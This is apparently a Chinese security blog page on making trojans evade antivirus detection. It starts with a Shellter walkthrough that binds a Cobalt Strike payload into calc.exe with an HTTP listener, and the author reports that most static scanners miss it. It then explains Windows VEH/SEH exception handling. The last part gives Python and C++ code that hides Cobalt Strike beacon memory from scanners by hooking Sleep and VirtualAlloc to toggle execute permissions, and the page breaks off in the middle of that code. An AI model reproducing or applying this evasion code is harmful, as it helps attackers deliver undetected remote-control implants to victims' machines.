<h1 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>Shellter是一种动态二进制程序壳程序，它可以在现有的可执行文件中隐藏恶意软件。它使用动态链接库技术来实现恶意代码的注入，并且可以在不修改现有的可执行文件的情况下进行注入。这使得它非常难以检测，因为它不会改变文件的哈希值或数字签名</p>
<p>Shellter的官方下载地址：<a target="_blank" rel="noopener" href="https://www.shellterproject.com/">https://www.shellterproject.com/</a></p>
<p>当前Shellter最新免费版本是v7.2，最新收费版本是v_pro4.7</p>
<h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="1-选择模式"><a href="#1-选择模式" class="headerlink" title="1.选择模式"></a>1.选择模式</h3><p>点击shellter.exe运行工具进入命令行界面, 随后选择模式, 这里我输入A, 即选择自动模式</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126212152241.png" alt="image-20230126212152241">		</p>
<h3 id="2-绑定32位PE文件"><a href="#2-绑定32位PE文件" class="headerlink" title="2.绑定32位PE文件"></a>2.绑定32位PE文件</h3><p>填写PE文件路径并要求此PE文件是32位的, 此处我以32位的calc.exe(计算器)为例, 先将calc.exe拖到Shellter文件目录, 然后填写PE文件路径, 随后会在Shellter_Backups目录备份原PE文件</p>
<img src="木马免杀之工具篇/image-20230126213343207.png" alt="image-20230126213343207" style="zoom:67%;" />	

<img src="木马免杀之工具篇/image-20230126213510379.png" alt="image-20230126213510379" style="zoom:67%;" />			



<h3 id="3-是否开启隐身模式"><a href="#3-是否开启隐身模式" class="headerlink" title="3.是否开启隐身模式"></a>3.是否开启隐身模式</h3><p>询问是否启用隐身模式, 此处我选择了Yes</p>
<blockquote>
<p>启用隐身模式后, 执行生成的免杀木马不仅可以上线, 还能正常使用原PE文件的功能, 但缺点是免杀效果差</p>
</blockquote>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126213740706.png" alt="image-20230126213740706">	</p>
<h3 id="4-填写监听"><a href="#4-填写监听" class="headerlink" title="4.填写监听"></a>4.填写监听</h3><p>询问你是使用工具自带的payload还是自定义监听, 此处我输入L选择自带payload, 然后输入2选着HTTP监听</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214117290.png" alt="image-20230126214117290">	</p>
<p>此处我使用CS来创建监听, 监听的地址和端口是<code>192.168.47.155:80</code>, 然后在Shellter命令行中填写</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214320371.png" alt="image-20230126214320371"></p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214440736.png" alt="image-20230126214440736">		</p>
<h3 id="5-测试效果"><a href="#5-测试效果" class="headerlink" title="5.测试效果"></a>5.测试效果</h3><p>生成的免杀木马会覆盖原先PE文件, 执行效果如下图所示</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/%E5%8A%A8%E7%94%BB.gif" alt="动画">	</p>
<h2 id="杀软测试-1"><a href="#杀软测试-1" class="headerlink" title="杀软测试"></a>杀软测试</h2><p>将免杀木马发送到杀毒平台检测, 可以发现还是能绕过绝大多数杀软的, 像火绒,360杀毒这些主流杀软都能绕过, 但是这只仅仅是静态扫描, 动态扫描还是很难绕过</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126215153437.png" alt="image-20230126215153437">	</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
      <meta itemprop="name" content="Xiao Ni">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chensicha‘s blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/29/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>CPU检测到异常 -&gt; 查中断表执行处理函数 -&gt; CommonDispatchException -&gt; KiDispatchException -&gt;  KiUserExceptionDispatcher -&gt; RtlDispatchException -&gt; VEH -&gt; SEH</p>
<p> CPU异常执行的流程</p>
<p> 1、CPU指令检测到异常</p>
<p> 2、查IDT表，执行中断处理函数</p>
<p> 3、调用CommonDispatchException(构建EXCEPTION_RECORD)</p>
<p> 4、KiDispatchException(分发异常：目的是找到异常的处理函数)</p>
<h1 id="Windows异常处理流程"><a href="#Windows异常处理流程" class="headerlink" title="Windows异常处理流程"></a>Windows异常处理流程</h1><p>在Windows中，异常处理的机制包括向量异常处理（VEH）、结构化异常处理（SEH）和C++异常处理（C++EH）。当发生异常时，它们的执行顺序如下：</p>
<ol>
<li><strong>终止当前程序的执行</strong>：首先，异常导致当前指令的执行被终止。CPU然后开始查找可以处理异常的代码。</li>
<li><strong>调试器</strong>：如果进程正在被调试，操作系统会首先将异常通知给调试器。调试器可以选择处理异常，或者让操作系统继续其正常的异常处理流程。</li>
<li><strong>向量异常处理（VEH）</strong>：如果存在VEH处理器，它们将首先得到机会处理异常。VEH处理器按照它们注册的顺序被调用，如果任何一个VEH处理器处理了异常（即返回<code>EXCEPTION_CONTINUE_EXECUTION</code>），则后续的VEH处理器和SEH处理器将不会被调用。</li>
<li><strong>结构化异常处理（SEH）</strong>：如果所有的VEH处理器都无法处理异常，或者没有注册VEH处理器，操作系统会开始调用SEH处理器。SEH处理器按照它们在堆栈中的顺序（即反注册的顺序）被调用，如果任何一个SEH处理器处理了异常（即返回<code>EXCEPTION_CONTINUE_EXECUTION</code>），则后续的SEH处理器将不会被调用。</li>
<li><strong>C++异常处理（C++EH）</strong>：如果所有的SEH处理器都无法处理异常，或者没有注册SEH处理器，且异常是一个C++异常（即由C++的<code>throw</code>语句抛出的异常），则会调用C++的异常处理器。</li>
<li><strong>如果所有的异常处理器都无法处理异常</strong>：如果所有的异常处理器都无法处理异常，或者没有注册任何异常处理器，操作系统通常会终止当前进程，并显示一个错误消息。</li>
</ol>
<p>在这个过程中，VEH处理器是优先于SEH处理器被调用的，这是因为VEH处理器更加灵活，可以用来处理一些在SEH中难以处理的异常情况。例如，当发生堆栈溢出时，由于SEH处理器需要使用堆栈来执行，因此无法处理这种异常，但VEH处理器则可以处理</p>
<h1 id="VEH"><a href="#VEH" class="headerlink" title="VEH"></a>VEH</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>向量异常处理（Vectored Exception Handling，VEH）是 Windows 提供的一种异常处理机制，可以用 <code>AddVectoredExceptionHandler</code> 函数来添加一个向量异常处理器（vectored exception handler）。这个函数需要两个参数：第一个参数指定处理器的优先级，如果为 <code>TRUE</code>，处理器将被添加到链表的开始，如果为 <code>FALSE</code>，处理器将被添加到链表的末尾；第二个参数是指向处理器函数的指针</p>
<h2 id="代码实例"><a href="#代码实例" class="headerlink" title="代码实例"></a>代码实例</h2><p>以下代码中的<code>idiv ecx</code>指令是用于将寄存器的EDX:EAX的值除以ECX寄存器的值，并将结果放入EAX中，将余数放入EDX中</p>
<blockquote>
<p>在x86架构的CPU中，EDX和EAX是32位寄存器。在进行一些特定的操作（比如长除法和长乘法）时，这两个寄存器会一起使用，形成一个64位的值。其中，EDX是高32位，EAX是低32位</p>
</blockquote>
<p>在下述代码中， “xor ecx, ecx” 指令将 ECX 寄存器的值设置为 0。当你尝试执行 “idiv ecx” 指令时，就相当于试图用 0 作为除数进行除法运算。在数学中，用 0 作为除数是没有定义的，因此 CPU 会触发一个异常，即你所看到的 0xC0000094</p>
<p>这个异常被你的 VEH 函数捕获，然后修复了异常状态（通过将 ECX 寄存器的值修改为 1），并告诉操作系统继续执行程序。这就是为什么你的程序在除法操作之后能够继续运行，打印出 “veh_code run here again” 的原因</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个函数指针类型，该函数是用来添加VEH（向量异常处理程序）的</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">PVOID</span><span class="params">(NTAPI* FnAddVectoredExceptionHandler)</span><span class="params">(ULONG, _EXCEPTION_POINTERS*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个指向FnAddVectoredExceptionHandler类型的函数指针变量</span></span><br><span class="line">FnAddVectoredExceptionHandler MyAddVectoredExceptionHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向量异常处理程序。该函数可以返回两种值：EXCEPTION_CONTINUE_EXECUTION 表示已处理异常，EXCEPTION_CONTINUE_SEARCH 表示未处理异常</span></span><br><span class="line"><span class="function">LONG NTAPI <span class="title">VectExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 当异常发生时，弹出一个消息框提示异常已发生</span></span><br><span class="line">    ::<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;VEH Function run&quot;</span>, <span class="string">&quot;VEH error&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否发生了除0异常（异常代码0xC0000094），如果是，则处理异常并继续执行程序</span></span><br><span class="line">    <span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xC0000094</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 修改寄存器ECX的值为1，避免再次发生除0异常</span></span><br><span class="line">        pExcepInfo-&gt;ContextRecord-&gt;Ecx = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回EXCEPTION_CONTINUE_EXECUTION表示异常已被处理，程序可以继续执行</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果发生的异常不是我们想要处理的，返回EXCEPTION_CONTINUE_SEARCH表示异常未处理，系统需要寻找其他的异常处理程序来处理这个异常</span></span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加向量异常处理程序并测试它</span></span><br><span class="line"><span class="function">VOID <span class="title">VEH</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 使用MyAddVectoredExceptionHandler函数，将VectExceptionHandler函数添加到VEH链表的头部</span></span><br><span class="line">    <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, VectExceptionHandler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟发生一个除0异常，用于测试我们的VEH函数是否可以正常工作</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">xor</span> edx, edx</span><br><span class="line">        <span class="keyword">xor</span> ecx, ecx</span><br><span class="line">        mov eax, <span class="number">0x10</span></span><br><span class="line">        idiv ecx <span class="comment">// EDX:EAX 除以 ECX，由于ECX为0，所以这里会发生除0异常</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果VEH函数正确地处理了异常，那么程序将会继续执行到这里</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;veh_code run here again&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 调用VEH函数，添加向量异常处理程序并测试它</span></span><br><span class="line">    <span class="built_in">VEH</span>();</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>SEH（Structured Exception Handling，结构化异常处理）是Windows操作系统中的一种错误处理和异常处理机制。SEH提供了一种强大、灵活且通用的方法来处理异常，它使得开发者能够为应用程序中发生的运行时错误和异常编写自定义的处理代码</p>
<p>在C++中，可以使用<code>_try</code>、<code>_except</code>和<code>_finally</code>关键字来实现SEH异常处理。<code>_try</code>块包含可能引发异常的代码；<code>_except</code>块包含处理异常的代码；而<code>_finally</code>块包含在任何情况下都应执行的代码，无论是否发生异常</p>
<h2 id="代码实例-1"><a href="#代码实例-1" class="headerlink" title="代码实例"></a>代码实例</h2><p>在下述例子中，<code>CauseException</code> 函数尝试对空指针进行解引用，这会引发一个访问违规（access violation）异常。这个异常在 <code>main</code> 函数的 <code>__try</code> 块中被捕获，并在 <code>__except</code> 块中被处理</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CauseException</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">nullptr</span>;</span><br><span class="line">    *p = <span class="number">0</span>;  <span class="comment">// This will cause an access violation exception</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="built_in">CauseException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    __except(EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Caught an exception\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="使用VEH绕过内存查杀"><a href="#使用VEH绕过内存查杀" class="headerlink" title="使用VEH绕过内存查杀"></a>使用VEH绕过内存查杀</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在今天的高级网络威胁环境中，恶意软件需要采取复杂的策略来避免被安全软件检测。其中一种策略就是动态地更改执行内存的属性。</p>
<p>通常，杀毒软件会扫描进程中带有可执行属性的内存区域，这是因为它们可能包含恶意代码。</p>
<p>然而，如果我们在适当的时机去除内存区域的可执行属性，就可以避免这种扫描，从而避开杀毒软件的侦查。但是，问题在于，如果我们去除内存的可执行属性，恶意代码就无法运行了。</p>
<p>不过，我们可以利用Windows的异常处理机制，在需要运行恶意代码的时候临时恢复其可执行属性。然后，当代码进入休眠状态时，我们再次去除其可执行属性，使其隐藏起来。这样，恶意代码就可以在需要的时候运行，而在不需要的时候则隐藏起来，避开杀毒软件的侦查。</p>
<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>1.使用 <code>AddVectoredExceptionHandler</code> 注册一个异常处理函数 <code>FirstVectExcepHandler</code>，这个函数会在发生异常时被调用。当程序访问了一个非法的内存地址（如访问一个没有权限的内存区域）时，系统会引发一个异常，这时异常处理函数就会被调用</p>
<p>2.使用 <code>Hook()</code> 函数钩住 <code>VirtualAlloc</code> 和 <code>Sleep</code> 两个系统函数。这样，每次调用这两个函数时，实际上都会执行我们定义的 <code>NewVirtualAlloc</code> 和 <code>NewSleep</code> 函数，其中<code>NewVirtualAlloc</code> 函数用于记录分配的内存区域的地址和大小，以便后续操作</p>
<p>3.<code>NewSleep</code> 函数中，首次调用时，会释放之前分配的内存，然后唤醒 <code>Beacon_set_Memory_attributes</code> 线程，这个线程会修改内存区域的权限为 PAGE_READWRITE，也就是只有读写权限，没有执行权限</p>
<p>4.<code>FirstVectExcepHandler</code> 是注册的异常处理函数，当访问的内存区域没有执行权限时，会产生一个异常，这时这个函数会被调用。这个函数首先判断异常是否是访问违规（代码 0xc0000005），并且是否是在我们之前记录的内存区域内，如果是，就将内存区域的权限修改为 PAGE_EXECUTE_READWRITE，也就是添加了执行权限，并让程序继续执行</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>首先使用python写一个将二进制文件转换成16进制字符串并保存到txt文件的脚本，这是因为CobaltStrike生成的bin文件会报毒，需对其进行处理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入必要的库</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要转换的二进制文件路径</span></span><br><span class="line">bin_file_path = <span class="string">&quot;cobalt_strike.bin&quot;</span></span><br><span class="line"><span class="comment"># 指定转换结果保存的txt文件路径</span></span><br><span class="line">txt_file_path = <span class="string">&quot;cobalt_strike_hex.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取二进制文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(bin_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_content = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将二进制内容转换为16进制字符串</span></span><br><span class="line">hex_content = binascii.hexlify(bin_content).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将16进制字符串保存到txt文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(txt_file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(hex_content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换完成，16进制内容已保存到&#123;&#125;中&quot;</span>.<span class="built_in">format</span>(txt_file_path))</span><br></pre></td></tr></table></figure>



<p>如下代码是利用VEH异常处理绕过内存查杀的主要实现</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours/detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours/detver.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量声明</span></span><br><span class="line">LPVOID Beacon_address; <span class="comment">// Beacon内存地址</span></span><br><span class="line">SIZE_T Beacon_data_len; <span class="comment">// Beacon内存长度</span></span><br><span class="line">DWORD Beacon_Memory_address_flOldProtect; <span class="comment">// Beacon内存属性</span></span><br><span class="line">HANDLE hEvent; <span class="comment">// 事件句柄</span></span><br><span class="line"></span><br><span class="line">BOOL Vir_FLAG = TRUE; <span class="comment">// 感染标记</span></span><br><span class="line">LPVOID shellcode_addr; <span class="comment">// shellcode内存地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义两个指向原函数的指针，分别是Sleep和VirtualAlloc</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">VOID</span><span class="params">(WINAPI* OldSleep)</span><span class="params">(DWORD dwMilliseconds)</span> </span>= Sleep;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">LPVOID</span> <span class="params">(WINAPI *OldVirtualAlloc)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> </span>= VirtualAlloc;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义Sleep和VirtualAlloc的钩子函数</span></span><br><span class="line"><span class="function">LPVOID WINAPI <span class="title">NewVirtualAlloc</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> </span>&#123;</span><br><span class="line">	Beacon_data_len = dwSize;</span><br><span class="line">	Beacon_address = <span class="built_in">OldVirtualAlloc</span>(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Memory Allocation Size:%d\n&quot;</span>, Beacon_data_len);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Memory Allocation Address:%llx \n&quot;</span>, Beacon_address);</span><br><span class="line">	<span class="keyword">return</span> Beacon_address;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> WINAPI <span class="title">NewSleep</span><span class="params">(DWORD dwMilliseconds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (Vir_FLAG)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Free Memory Address:%llx\n&quot;</span>, shellcode_addr);</span><br><span class="line">		<span 